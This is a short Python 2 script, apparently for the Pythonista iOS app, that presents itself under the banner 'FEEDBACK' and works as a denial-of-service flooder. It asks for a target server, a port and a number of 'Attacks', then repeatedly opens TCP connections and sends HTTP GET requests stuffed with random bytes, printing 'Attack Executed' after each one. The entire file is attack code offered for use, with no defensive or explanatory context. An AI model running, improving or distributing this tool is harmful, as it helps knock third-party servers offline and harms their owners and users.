from __future__ import print_function
import time, socket, os, sys, string, random, console
console.set_color(255, 0, 0)
print("\n      -+--=:=- -==- -=:=--+-")
console.set_color()
print("             FEEDBACK")
console.set_color(255, 0, 0)
print("      -+--=:=- -==- -=:=--+-\n")
console.set_color()
host=raw_input(" -+- Server: ")
port=int(input(" -+- Port: "))
message=random._urandom(1024)
conn=input( " -+- Attacks: " )
print("")
ip = socket.gethostbyname( host )
def dos():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	socket.setdefaulttimeout(4)
	try:
		s.connect((host, int(port)))
		s.send( "GET /%s HTTP/1.1\r\n" % message )
		s.sendto( "GET /%s HTTP/1.1\r\n" % message, (ip, port) )
		s.send( "GET /%s HTTP/1.1\r\n" % message )
	except socket.error as msg:
		console.set_color(255, 0, 0)
		print("-[Connection Failed]-=@=--+-")
		console.set_color()
	else:
		print ( "-[Attack Executed]-=:=--+-")
	console.set_color()
	s.close()
for i in xrange(conn):
	dos()
